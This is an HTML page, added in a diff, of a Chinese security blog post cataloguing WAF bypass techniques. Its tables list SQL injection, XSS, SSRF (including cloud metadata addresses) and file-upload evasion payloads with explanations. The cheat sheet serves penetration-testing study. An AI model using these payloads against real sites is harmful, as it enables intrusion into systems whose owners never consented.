@@ -1,0 +1,383 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>WAF bypass技巧 | h4m5t's Blog</title><meta name="author" content="h4m5t"><meta name="copyright" content="h4m5t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="WAF : Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。  1.1 寻找真实IP    域名历史解析记录 内部邮箱源 扫描网站测试文件 子域名所在IP段 信息泄露 国外访问 A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF bypass技巧">
+<meta property="og:url" content="http://h4m5t.github.io/2021/02/11/WAF/index.html">
+<meta property="og:site_name" content="h4m5t&#39;s Blog">
+<meta property="og:description" content="WAF : Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。  1.1 寻找真实IP    域名历史解析记录 内部邮箱源 扫描网站测试文件 子域名所在IP段 信息泄露 国外访问 A">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-5.png">
+<meta property="article:published_time" content="2021-02-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-04T11:47:52.645Z">
+<meta property="article:author" content="h4m5t">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-5.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://h4m5t.github.io/2021/02/11/WAF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WAF bypass技巧',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-12-04 19:47:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="h4m5t's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-5.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h4m5t's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WAF bypass技巧</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-10T16:00:00.000Z" title="发表于 2021-02-11 00:00:00">2021-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-04T11:47:52.645Z" title="更新于 2022-12-04 19:47:52">2022-12-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WAF bypass技巧"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>WAF : Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
+</blockquote>
+<p>1.1 寻找真实IP</p>
+<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/02/08/4i9xt2ROmVPE5N6.png" alt="e7d9f2da-0fac-432b-bf65-bc3b66afa3d3" style="zoom:50%;" />
+
+<ul>
+<li>域名历史解析记录</li>
+<li>内部邮箱源</li>
+<li>扫描网站测试文件</li>
+<li>子域名所在IP段</li>
+<li>信息泄露</li>
+<li>国外访问</li>
+<li>APP抓包</li>
+</ul>
+<p>1.2 注入绕过</p>
+<table>
+<thead>
+<tr>
+<th><strong>绕过方式</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>大小写绕过</strong></td>
+<td><strong>UniOn SeleCt</strong></td>
+<td><strong>针对特定关键字，大小写不敏感，SQL语句不分大小写</strong></td>
+</tr>
+<tr>
+<td><strong>双写绕过</strong></td>
+<td><strong>Ununionion seselectlect</strong></td>
+<td><strong>过滤后仍是注入语句（只过滤了一次）</strong></td>
+</tr>
+<tr>
+<td><strong>内联注释绕过</strong></td>
+<td><strong>and &#x2F;</strong>****!***<strong>select * from test*&#x2F;</strong></td>
+<td><strong>mysql扩展功能，在&#x2F;*后加惊叹号，注释中的语句会被执行</strong></td>
+</tr>
+<tr>
+<td><strong>注释符绕过</strong></td>
+<td><strong>uni&#x2F;*<em>&#x2F;on se&#x2F;*</em>&#x2F;lect</strong></td>
+<td><strong>注释符号不影响语句的连接</strong></td>
+</tr>
+<tr>
+<td><strong>对or&#x2F;and的绕过</strong></td>
+<td><strong>and &#x3D; &amp;&amp;，or &#x3D; ||</strong></td>
+<td><strong>等价逻辑符号</strong></td>
+</tr>
+<tr>
+<td><strong>对单引号的绕过</strong></td>
+<td><strong>十六进制编码</strong> <strong>宽字节注入</strong> <strong><a target="_blank" rel="noopener" href="http://www.xxx.com/login.php?user=%EF%BF%BD****%E2%80%99">http://www.xxx.com/login.php?user=%df****’</a> or 1&#x3D;1</strong>  　<strong>%df****’转义后为&#x3D;%df%5c%27&#x3D;運’</strong> 　<strong>select * fromcms_user where username &#x3D; ‘運’ or 1&#x3D;1</strong></td>
+<td><strong>数值型可以不加单引号</strong> <strong>将转义符号闭合掉</strong> <strong>mysql使用GBK多字节编码，GPC开启(php.ini，magic_quotes_gpc &#x3D; On)，输入%df%27时首先经过上面提到的转义就会变成%df%5c%27(%5c就是反斜杠)。之后再数据库查询由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字，然后MySQL服务器会对查询语句进行了GBK编码%df%5c转换成汉字，而单引号逃出了</strong></td>
+</tr>
+<tr>
+<td><strong>等价函数替换</strong></td>
+<td><strong>hex() bin() 等价于ascii()</strong> <strong>Sleep() 等价于benchmark()</strong></td>
+<td><strong>函数结果相同</strong></td>
+</tr>
+<tr>
+<td><strong>空格绕过</strong></td>
+<td><strong>select&#x2F;*<em>&#x2F;*&#x2F;*</em>&#x2F;from&#x2F;**&#x2F;yz;</strong> <strong>select%0a*%0afrom%0ayz; %0a 是回车</strong> <strong>select(a)from(yz);</strong></td>
+<td><strong>使用其他字符替换空格</strong></td>
+</tr>
+</tbody></table>
+<p>1.3 XSS绕过</p>
+<p>反射型：</p>
+<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/02/08/L9GFTpHRDWi2XZn.png" alt="1" style="zoom:33%;" />
+
+<p>存储型：</p>
+<img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/02/08/rc3XHKfvDhjJiuZ.png" alt="3" style="zoom:33%;" />
+
+
+
+<table>
+<thead>
+<tr>
+<th><strong>绕过方式</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>标签闭合</strong></td>
+<td><strong><script> var aaa="123" ;</script>,可控为aaa的值，那么可以使用 “&gt; 闭合来绕过，<script> var aaa=""></script><script>alert(1)</script>“</script></strong></td>
+<td><strong>利用”&gt; </script>等标签来闭合前面标签来达到绕过插入任意JS的效果</strong></td>
+</tr>
+<tr>
+<td><strong>标签优先性</strong></td>
+<td><strong><noscript><img src= "/img/loading.gif" data-lazy-src="asdasd</noscript><img src= "/img/loading.gif" data-lazy-src=\* onerror=prompt(1)>"></noscript></strong></td>
+<td><strong>利用标签解析的优先性绕过。</strong> <strong>比如<noscript >标签比<img>标签解析优先性更高，所以</noscript >会优先闭合，导致<img>标签逃逸，从而造成xss执行</strong></td>
+</tr>
+<tr>
+<td><strong>常见编码</strong></td>
+<td><strong><a href=javascript:alert(2)>a</a></strong>  <strong><a href=javascript://baidu.com%0aalert(document.domain)>aa</a>&gt;</strong>  <strong>&lt;svg&#x2F;onload&#x3D;setTimeout(‘\x61\x6C\x65\x72\x74\x28\x31\x29’)&gt;</strong></td>
+<td><strong>利用常见的一些编码方式去绕过。比如利用 : 当成 冒号: 来绕过，( 和 ) 等效与左右括号 ()</strong>  <strong>可控点在Json中时可使用Unicode编码绕过，在url中可用使用url双重编码等绕过</strong> <strong>%0a 为换行的URL编码，可以用来绕过一些Waf，从而执行后面的alert，类似于 Mysql中的%0a换行</strong> 利用<strong>各种类型的进制转换也可以用来绕过xss防御</strong></td>
+</tr>
+<tr>
+<td><strong>浏览器差异</strong></td>
+<td><strong><math><maction actiontype="statusline" xlink:href="javascript:prompt(3)">Test</maction></math></strong> <strong>比如 .url 后缀文件也可用造成xss</strong>  <strong>比如利用IE浏览器中也有一些特性或者函数</strong> <strong><iframe src="vbscript:msgbox(1)"></iframe></strong></td>
+<td><strong>比如<math>标签在Firfox浏览器可以解析并造成XSS漏洞，可以用来绕过黑名单等</strong>  <strong>.url 后缀文件在Firfox浏览器中也会解析成htm文件，也会造成xss</strong>  <strong>比如利用IE浏览器中一些独特函数来执行xss</strong></td>
+</tr>
+<tr>
+<td><strong>关键字、函数绕过</strong></td>
+<td><strong><img src= "/img/loading.gif" data-lazy-src=x onerror="top['al'+'ert'](0)"></img></strong> <strong><script>alert?.(123)</script></strong></td>
+<td><strong>利用JS的特性，以拼接的方式来组合关键字，从而绕过waf的关键字检测</strong> <strong>加入一些特殊字符也可以绕过waf对关键函数的检测</strong></td>
+</tr>
+<tr>
+<td><strong>Fuzz</strong></td>
+<td><strong>JSFuck</strong></td>
+<td><strong>可以利用Fuzz来发现一些黑名单中未包含到的标签、事件、关键函数</strong></td>
+</tr>
+</tbody></table>
+<p>1.4 SSRF绕过</p>
+<table>
+<thead>
+<tr>
+<th><strong>绕过方式</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>原理</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>进制转换</strong></td>
+<td><strong>十进制</strong> <strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433/</a> &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></strong> <strong><a target="_blank" rel="noopener" href="http://192.168.0.1/">http://3232235521/</a> &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://192.168.0.1/">http://192.168.0.1</a></strong> <strong><a target="_blank" rel="noopener" href="http://192.168.1.1/">http://3232235777/</a> &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a></strong> <strong><a target="_blank" rel="noopener" href="http://169.254.169.254/">http://2852039166/</a>  &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254</a></strong> <strong>十六进制</strong> <strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7f000001/</a> &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></strong> <strong><a target="_blank" rel="noopener" href="http://192.168.0.20/">http://0xc0a80014/</a> &#x3D;</strong> <strong><a target="_blank" rel="noopener" href="http://192.168.0.20/">http://192.168.0.20</a></strong></td>
+<td><strong>利用十进制、十六进制形式的ip绕过检测，十进制、十六进制的ip在请求时会正常解析，但检测时可能遗漏</strong></td>
+</tr>
+<tr>
+<td><strong>特殊ip形式</strong></td>
+<td><strong>http:&#x2F;&#x2F;[::]:80&#x2F;&#x3D;127.0.0.1</strong> <strong><a target="_blank" rel="noopener" href="http://127.127.127.127/">http://127.127.127.127</a></strong> <strong>127.0.0.1.xip.io</strong> <strong>127。0。0。1  &#x3D;  127.0.0.1</strong> <strong>http:&#x2F;&#x2F;ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &#x3D;</strong> <strong>example.com</strong> <strong>http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]</strong></td>
+<td><strong>利用 [::]、CIDR （ip划分方法）绕过<strong><strong>localhost</strong></strong>限制</strong>   <strong>利用封闭式字母数字绕过检测</strong> <strong>利用ipv6绕过检测</strong></td>
+</tr>
+<tr>
+<td><strong>正则缺陷</strong></td>
+<td><strong><a href="http://127.1.1.1:80****\@127.2.2.2:80/">http://127.1.1.1:80****\@127.2.2.2:80/</a></strong> <strong><a target="_blank" rel="noopener" href="http://127.1.1.1/">http://127.1.1.1:80</a></strong><strong>:@@127.2.2.2:80&#x2F;</strong> **<a target="_blank" rel="noopener" href="http://127.1.1.1/#****\@127.2.2.2:80/">http://127.1.1.1:80#****\@127.2.2.2:80/</a>** <strong><a target="_blank" rel="noopener" href="http://endswith{domain}/">http://endswith{domain}/</a></strong> **http:&#x2F;&#x2F;{domain}.**<strong>localhost</strong></td>
+<td><strong>利用检测正则表达式缺陷绕过，如仅检测字符串是否包含白名单域名或以白名单域名结尾，或者正则未转义点号导致绕过等</strong></td>
+</tr>
+<tr>
+<td><strong>解析库与请求库差异导致绕过</strong></td>
+<td><strong><a target="_blank" rel="noopener" href="http://1.1.1.1/">http://1.1.1.1</a></strong> <strong>&amp;@2.2.2.2# @3.3.3.3&#x2F;</strong> <strong>urllib2 : 1.1.1.1</strong> <strong>requests + browsers : 2.2.2.2</strong> <strong>urllib : 3.3.3.3</strong></td>
+<td><strong>利用检测时使用的URL parse库与请求时使用的parse库的差异绕过，如</strong> <strong><a target="_blank" rel="noopener" href="http://1.1.1.1/">http://1.1.1.1</a></strong> <strong>&amp;@2.2.2.2# @3.3.3.3&#x2F; 不同的parse库的解析结果不一样</strong></td>
+</tr>
+<tr>
+<td><strong>302跳转绕过</strong></td>
+<td><strong>Create a page on a whitelisted host that redirects requests to the SSRF the target URL</strong></td>
+<td><strong>利用可信域名的302跳转绕过检测</strong></td>
+</tr>
+<tr>
+<td><strong>dnsrebind绕过</strong></td>
+<td><strong>Create a domain that change between two IPs</strong></td>
+<td><strong>设置两条A记录</strong>，<strong>利用dns重绑定绕过检测，第一次解析返回正常ip，第二次返回内网地址（dns解析记录缓存存活的时间为0，相当于每次解析都要去重新请求dns服务器，无法在本地缓存）</strong></td>
+</tr>
+</tbody></table>
+<p>1.5 上传绕过</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/02/08/JC2o7TOPcXYsDZN.png" alt="f31e7508-93be-4fcf-a9aa-7f0316e5c1f8"></p>
+<table>
+<thead>
+<tr>
+<th><strong>绕过方法</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>原理</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>js检查</strong></td>
+<td><strong>绕过前端</strong></td>
+<td><strong>通过抓包提交，绕过前端js检测</strong> <strong>删除对js验证脚本的调用，使其不能对上传的文件类型做检测，从而达到绕过</strong></td>
+</tr>
+<tr>
+<td><strong>上传特殊可解析后缀</strong></td>
+<td><strong>jsp jspx jspf</strong> <strong>asp asa cer aspx</strong> <strong>php  php3 php4 pht phtml</strong></td>
+<td><strong>绕过黑名单，同样可以执行脚本</strong></td>
+</tr>
+<tr>
+<td><strong>上传.htaccess</strong></td>
+<td><strong>&lt;FilesMatch “bytedance”&gt;</strong>          <strong>SetHandler application&#x2F;x-httpd-php </FilesMatch></strong></td>
+<td><strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</strong>    <strong>通过.htaccess文件，调用php的解析器解析一个文件名只要包含“bytedance”这个字符串的任意文件</strong></td>
+</tr>
+<tr>
+<td><strong>后缀大小写绕过</strong></td>
+<td><strong>1.php   &#x3D;&#x3D;&gt;   1.pHP</strong></td>
+<td><strong>由于windows不区分大小写，后端校验未使用strtolower等函数将文件后缀大小写统一处理，导致黑名单不完整而绕过</strong></td>
+</tr>
+<tr>
+<td><strong>空格绕过</strong></td>
+<td><strong>1.php   &#x3D;&#x3D;&gt;   1.php（空格）</strong></td>
+<td><strong>由于Windows处理文件时，会自动删除文件后缀带有的空格和点，从而导致绕过</strong></td>
+</tr>
+<tr>
+<td><strong>::DATA绕过</strong></td>
+<td><strong>1.php::$DATA&#x3D;&#x3D;&gt;1.php</strong></td>
+<td><strong>Windows的一种流文件格式，上传这种格式流文件格式的同时会在相同目录下生成一个含有相同内容宿主文件</strong></td>
+</tr>
+<tr>
+<td><strong>双写后缀绕过</strong></td>
+<td><strong>1.phphpp  &#x3D;&#x3D;&gt; 1.php</strong></td>
+<td><strong>后端过滤时，使用了preg_replace等替换函数将php关键字替换为空，但是却没有循环替换，导致前面的ph和后面的p重新组合成php，从而导致绕过</strong></td>
+</tr>
+<tr>
+<td><strong>MIME绕过</strong></td>
+<td><strong>GIF        image&#x2F;gif</strong> <strong>JPG        image&#x2F;pjpeg        image&#x2F;jpeg</strong> <strong>ZIP        application&#x2F;x-compressed        application&#x2F;octet-stream</strong> <strong>JSP        text&#x2F;html</strong>  <strong>EXE        application&#x2F;octet-stream</strong></td>
+<td><strong>修改Content-Type中为允许的类型</strong></td>
+</tr>
+<tr>
+<td><strong>%00截断</strong></td>
+<td><strong>1.php%00a.jpg&#x3D;1.php</strong></td>
+<td><strong>PHP&lt;5.3.29，且GPC关闭时，%00在URL中充当结束符，当解析到%00时，解析器就会认为字符串已经读取完毕（%00截断主要用在路径上的截断）</strong></td>
+</tr>
+<tr>
+<td><strong>0x00截断</strong></td>
+<td><strong>1.php.jpg&#x3D;&#x3D;&gt;1.php0x00jpg(0x00为16进制)</strong></td>
+<td><strong>PHP&lt;5.3.29，且GPC关闭时，0x00截断其实也是16进制截断，需要修改16进制的数据头，0x00也是截断符号，0x00就是%00解码成的16进制，原理其实与%00截断一样</strong></td>
+</tr>
+<tr>
+<td><strong>文件头检查绕过</strong></td>
+<td><strong>GIF89a或在图片中插入一句话</strong></td>
+<td><strong>检查指定文件头时可绕过</strong></td>
+</tr>
+<tr>
+<td><strong>二次渲染绕过</strong></td>
+<td><strong>寻找图片渲染后没有变化的部分，插入一句话</strong></td>
+<td><strong>恶意脚本不被渲染掉</strong></td>
+</tr>
+<tr>
+<td><strong>条件竞争</strong></td>
+<td><strong>与后端代码写法有关。比如先上传文件后，再检查文件后缀是否合法，不合法就再删除。</strong></td>
+<td><strong>利用条件竞争删除文件时间差绕过。在文件上传到服务器，程序还未执行到删除文件代码之前，通过快速发送大量的数据包提前执行程序，达到绕过</strong></td>
+</tr>
+<tr>
+<td><strong>解析漏洞绕过</strong></td>
+<td><strong>参考解析漏洞表格</strong></td>
+<td><strong>参考解析漏洞表格</strong></td>
+</tr>
+</tbody></table>
+<p>1.6 其他方法</p>
+<p>1.HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p>
+<p>2.当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可轻易Bypass。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://h4m5t.github.io">h4m5t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://h4m5t.github.io/2021/02/11/WAF/">http://h4m5t.github.io/2021/02/11/WAF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://h4m5t.github.io" target="_blank">h4m5t's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-5.png" data-sites="wechat,qq,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/16/%E7%BA%A2%E9%98%9F/"><img class="prev-cover" src= "/img/loading.gif" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红队和渗透测试</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/10/%E5%89%8D%E7%AB%AFJS/"><img class="next-cover" src= "/img/loading.gif" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记录前端学习--JavaScript</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/21/%E5%89%8D%E7%AB%AFhtml/" title="记录前端学习--HTML"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-21</div><div class="title">记录前端学习--HTML</div></div></a></div><div><a href="/2021/01/27/Web%E5%AE%89%E5%85%A8/" title="web安全学习路线"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-27</div><div class="title">web安全学习路线</div></div></a></div><div><a href="/2021/01/28/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" title="浏览器的同源策略与跨站请求伪造（CSRF）"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN/img/material-10.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-28</div><div class="title">浏览器的同源策略与跨站请求伪造（CSRF）</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h4m5t</div><div class="author-info__description">人生得意需尽欢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h4m5t"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h4m5t" 